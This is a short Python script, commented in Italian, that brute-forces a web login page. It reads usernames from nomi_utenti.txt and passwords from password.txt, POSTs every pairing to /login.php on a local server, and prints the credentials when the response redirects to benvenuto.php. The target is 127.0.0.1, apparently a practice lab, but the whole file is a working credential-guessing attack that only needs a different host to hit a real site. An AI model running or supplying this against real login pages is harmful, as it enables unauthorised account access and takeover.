import http.client, urllib.parse

user_file = open('nomi_utenti.txt')
pass_file = open('password.txt')

user_list = user_file.readlines()
pass_list = pass_file.readlines()

for user in user_list:
	user = user.rstrip()
	for pwd in pass_list:
		pwd = pwd.rstrip()
		print (user, "-", pwd)
		post_par = urllib.parse.urlencode({'username': user, 'password': pwd, 'Submit': 'Submit'})
		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
		conn = http.client.HTTPConnection("127.0.0.1", 80)
		conn.request("POST", "/login.php", post_par, headers)
		response = conn.getresponse()
		if(response.getheader('Location') == "benvenuto.php"):
				print("Loggato con: ", user, "-", pwd)
				exit()
